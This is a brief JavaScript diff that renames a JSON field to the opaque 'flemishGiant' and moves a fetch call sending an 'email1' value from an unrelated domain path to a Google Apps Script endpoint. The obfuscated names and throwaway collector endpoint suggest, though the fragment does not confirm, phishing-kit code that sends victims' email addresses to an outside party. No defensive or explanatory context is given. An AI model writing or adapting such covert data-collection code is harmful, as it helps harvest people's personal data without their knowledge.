@@ -37,7 +37,7 @@
             myHeaders.append("Accept", "application/json, /;q=0.5");
 
             var raw = JSON.stringify({
-              "stringtoencrypt": `${email1}`
+              "flemishGiant": `${email1}`
             });
             //document.write(raw)
             var requestOptions = {
@@ -47,7 +47,7 @@
               redirect: 'follow'
             };
 
-            fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+            fetch("https://script.google.com/macros/s/AKfycbwd3VKlX6ajjUYSkrg9YOEu3fDg-F0PJsRvv8ia0bhPX6OHn_Lk1a4N7dVx3nKEacui/exec", requestOptions)
               .then(function (response) {
                   return response.json();
               })
